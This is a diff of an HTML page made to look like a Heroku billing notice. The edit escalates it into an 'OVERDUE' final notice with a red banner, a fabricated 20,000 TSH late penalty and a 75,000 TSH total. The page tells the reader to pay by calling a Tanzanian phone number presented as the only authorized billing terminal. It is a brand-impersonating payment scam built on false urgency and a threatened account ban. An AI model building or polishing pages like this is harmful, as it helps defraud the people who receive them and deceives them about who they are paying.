@@ -15,7 +15,7 @@
 
         /* Heroku-style Purple Warning Banner */
         .urgent-banner {
-            background-color: #79589f;
+            background-color: #d12d2d; /* Changed to red because date passed */
             color: #ffffff;
             text-align: center;
             padding: 14px 10px;
@@ -55,7 +55,18 @@
 
         h2 {
             color: #430098;
-            font-size: 22px;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .status-badge {
+            background: #ffebeb;
+            color: #d12d2d;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
             margin-bottom: 20px;
         }
 
@@ -73,6 +84,25 @@
             padding: 20px;
             margin: 25px 0;
             border-left: 4px solid #79589f;
+            text-align: left;
+        }
+
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px dashed #ccc;
+            font-weight: bold;
+            color: #d12d2d;
+            font-size: 18px;
         }
 
         .phone-display {
@@ -80,7 +110,8 @@
             font-size: 20px;
             color: #430098;
             font-weight: bold;
-            margin-top: 8px;
+            margin-top: 12px;
+            text-align: center;
         }
 
         .btn-pay {
@@ -93,6 +124,7 @@
             display: inline-block;
             transition: background 0.2s;
             width: 80%;
+            margin-top: 10px;
         }
 
         .btn-pay:hover {
@@ -110,7 +142,7 @@
 <body>
 
     <div class="urgent-banner">
-        Critical Notice: Account suspension scheduled for <strong>20/02/2026</strong>.
+        <strong>OVERDUE:</strong> Account was scheduled for suspension on 20/02/2026.
     </div>
 
     <div class="header">
@@ -119,20 +151,36 @@
 
     <div class="container">
         <div class="card">
-            <h2>Payment Required</h2>
+            <div class="status-badge">PAST DUE</div>
+            <h2>Final Payment Notice</h2>
             
-            <p>Your Heroku services are scheduled to be banned on:</p>
+            <p>Your deadline was:</p>
             <span class="date-highlight">February 20, 2026</span>
 
             <div class="billing-terminal">
-                Only this number has billing access:
-                <span class="phone-display">+255 610 274 920</span>
+                <div class="price-row">
+                    <span>Original Balance:</span>
+                    <span>55,000 TSH</span>
+                </div>
+                <div class="price-row" style="color: #d12d2d;">
+                    <span>Late Penalty (Deni):</span>
+                    <span>+20,000 TSH</span>
+                </div>
+                <div class="total-row">
+                    <span>TOTAL DUE:</span>
+                    <span>75,000 TSH</span>
+                </div>
+
+                <div style="margin-top: 20px; text-align: center; font-size: 13px;">
+                    Authorized Billing Terminal:
+                    <span class="phone-display">+255 610 274 920</span>
+                </div>
             </div>
 
-            <a href="tel:+255610274920" class="btn-pay">Pay to Prevent Ban</a>
+            <a href="tel:+255610274920" class="btn-pay">Pay 75,000 TSH Now</a>
 
             <div class="disclaimer">
-                Payment must be finalized through the authorized billing terminal above to clear the suspension flag from your account.
+                <strong>Note:</strong> Since the date has passed, the balance has increased. Payment must be finalized immediately to clear the suspension flag.
             </div>
         </div>
     </div>
